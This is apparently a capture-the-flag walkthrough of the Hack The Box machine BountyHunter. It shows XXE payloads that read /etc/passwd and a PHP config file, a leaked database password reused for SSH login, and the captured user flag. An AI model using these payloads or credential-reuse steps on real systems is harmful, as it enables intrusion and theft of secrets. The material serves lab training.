# # `Enumeration` -

![[Pasted image 20210726190454.png]]

We were able to visit the `portal` link on clicking on that were able to further visit `/log_submit.php` -

![[Pasted image 20210726190835.png]]

If we submit data it shows -

![[Pasted image 20211125233540.png]]


# # `Gobuster` -

```bash
root@napster:~/Documents/HTB/BountyHunter# gobuster dir -u http://10.10.11.100/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x
 php -t 20 -o gobuster.txt                                                                                                                                    
===============================================================                                                                                               
Gobuster v3.0.1                                                                                                                                               
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                               
===============================================================                                                                                               
[+] Url:            http://10.10.11.100/                                                                                                                      
[+] Threads:        20                                                                                                                                        
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt                                                                  
[+] Status codes:   200,204,301,302,307,401,403                                                                                                               
[+] User Agent:     gobuster/3.0.1                                                                                                                            
[+] Extensions:     php                                                                                                                                       
[+] Timeout:        10s                                                                                                                                       
===============================================================                                                                                               
2021/07/26 18:40:42 Starting gobuster                                                                                                                         
===============================================================                                                                                               
/index.php (Status: 200)                                                                                                                                      
/.php (Status: 403)                                                                                                                                           
/js (Status: 301)                                                                                                                                             
/css (Status: 301)                                                                                                                                            
/.htm (Status: 403)                                                                                                                                           
/.htm.php (Status: 403)                                                                                                                                       
/.html (Status: 403)                                                                                                                                          
/.html.php (Status: 403)                                                                                                                                      
/db.php (Status: 200)
```

`db.php` seems interesting.But the page is blank when we visit it.

# #  `/log_submit.php` -

Back to the Bounty Submit page we tried to catch the request with Burp for further Enumeration -

![[Pasted image 20211127003918.png]]

The data looks to be base64-encoded, and then url encoded (because the `=` on the end becomes `%3d`).

On decoding it we found -

![[Pasted image 20211127004238.png]]

The result is XML.

# # `XXE` -

Since the result is XML its worth  to try for `XXE(External Entities Attack)`.

The idea is that this website is taking the XML input and parsing it to get the different values out. In the site on BountyHunter, it must be pulling the `title`, `cwe`, `cvss`, and `reward` variables so that it can display them back on the results page.

If the site doesn’t properly handle the XML input, the libraries that parse it will allow the user to put in control text that does things like create variables and read files.

The example classic payload looks something like this (example from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)):

Reference -

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

The first line is very similar to what is sent in the POST for BountyHunter, and the last line is the XML data itself. The middle lines are defining an entity which includes the variable `&file` which is the contents of the `/etc/passwd` file. This allows the user to send in the contents of files they can’t read as input, and if that input is displayed back, then the exploit allows for file read.

Payload -

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY nap SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&nap;</title>
		<cwe>nap</cwe>
		<cvss>10.0</cvss>
		<reward>1000</reward>
		</bugreport>
```

Encode it as base64, then URL encode and finally send  the request -

![[Pasted image 20211127014904.png]]

We can read files :)

Now one interesting file obviously we would like to read will be `db.php` which we found from our Gobuster result.To read php files we will use `php filter` as it will avoid bad characters.

Reference(Payload All The Things) -

```bash
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

Payload -

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY nap SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
		<bugreport>
		<title>&nap;</title>
		<cwe>nap</cwe>
		<cvss>10.0</cvss>
		<reward>1000</reward>
		</bugreport>
```

Encode it to base64 and then url encode.

Result -

![[Pasted image 20211127020310.png]]

Now decode the result -

![[Pasted image 20211127020543.png]]

And we were able to still read /etc/passwd file.

# # `db.php` -

Same way we can get our db.php file -

Payload -

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY nap SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php" >]>
		<bugreport>
		<title>&nap;</title>
		<cwe>nap</cwe>
		<cvss>10.0</cvss>
		<reward>1000</reward>
		</bugreport>
```

Encode it to base64 and then url encode.

![[Pasted image 20211127020956.png]]

Output -

```bash
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

Base64 decode it -

```bash
root@napster:~/Documents/HTB/BountyHunter# echo "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

We already have userlist -

```bash
root@napster:~/Documents/HTB/BountyHunter# cat passwd | grep /bash
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
```

# # `SSH` -

```bash
root@napster:~/Documents/HTB/BountyHunter# ssh development@10.10.11.100
The authenticity of host '10.10.11.100 (10.10.11.100)' can't be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.100' (ECDSA) to the list of known hosts.
development@10.10.11.100's password:
development@bountyhunter:~$ whoami
development
development@bountyhunter:~$ ls -la
total 52
drwxr-xr-x 5 development development 4096 Nov 27 01:14 .
drwxr-xr-x 3 root        root        4096 Jun 15 16:07 ..
lrwxrwxrwx 1 root        root           9 Apr  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 development development  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 development development 3771 Feb 25  2020 .bashrc
drwx------ 2 development development 4096 Apr  5  2021 .cache
-rw-r--r-- 1 root        root         471 Jun 15 16:10 contract.txt
lrwxrwxrwx 1 root        root           9 Jul  5 05:46 .lesshst -> /dev/null
drwxrwxr-x 3 development development 4096 Apr  6  2021 .local
-rw-r--r-- 1 development development  807 Feb 25  2020 .profile
drwx------ 2 development development 4096 Apr  7  2021 .ssh
-rw-rw-r-- 1 development development   83 Nov 27 01:14 tkt.md
-r--r----- 1 root        development   33 Nov 26 06:21 user.txt
-rw------- 1 development development 7164 Nov 27 01:14 .viminfo
development@bountyhunter:~$ cat user.txt 
53147860182777837aa3fcb1e52b9d3a
```